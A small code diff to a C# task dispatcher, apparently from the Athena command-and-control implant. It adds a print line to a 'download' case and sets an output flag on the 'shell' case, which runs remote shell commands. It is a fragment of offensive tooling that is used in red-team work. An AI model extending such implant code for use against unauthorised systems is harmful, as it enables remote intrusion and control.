@@ -23,7 +23,7 @@ namespace Athena.Commands
                     checkAndRunPlugin(job);
                     break;
                 case "download":
-
+                    Console.WriteLine("Download");
                     break;
                 case "execute-assembly":
                     if (Globals.executeAssemblyTask != "")
@@ -210,6 +210,7 @@ namespace Athena.Commands
                 case "shell":
                     job.taskresult = Execution.ShellExec(job.task);
                     job.complete = true;
+                    job.hasoutput = true;
                     break;
                 case "sleep":
                     var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
